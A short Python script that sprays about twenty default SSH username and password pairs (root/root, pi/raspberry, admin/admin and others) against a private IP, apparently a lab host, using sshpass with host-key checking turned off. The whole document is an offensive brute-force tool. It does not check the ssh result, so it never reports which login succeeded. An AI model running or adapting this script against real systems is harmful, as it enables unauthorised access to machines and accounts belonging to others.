import subprocess, time

TARGET_IP = "192.168.56.10"

CREDENTIALS = [
    ("root", "root"), ("root", "123456"), ("root", "password"),
    ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
    ("user", "user"), ("test", "test"), ("ubuntu", "ubuntu"),
    ("pi", "raspberry"), ("oracle", "oracle"), ("guest", "guest"),
    ("deploy", "deploy"), ("postgres", "postgres"), ("mysql", "mysql"),
    ("ftp", "ftp"), ("mail", "mail"), ("web", "web"),
    ("jenkins", "jenkins"), ("hadoop", "hadoop"),
]

print(f"[*] Starting credential spray against {TARGET_IP}")
for user, passwd in CREDENTIALS:
    try:
        subprocess.run(
            ["sshpass", "-p", passwd, "ssh",
             "-o", "StrictHostKeyChecking=no",
             "-o", "ConnectTimeout=3",
             f"{user}@{TARGET_IP}", "exit"],
            capture_output=True, timeout=5
        )
        print(f"  Tried {user}:{passwd}")
        time.sleep(0.5)
    except Exception as e:
        print(f"  {user}:{passwd} - {e}")
        time.sleep(0.5)

print("[*] Spray complete.")
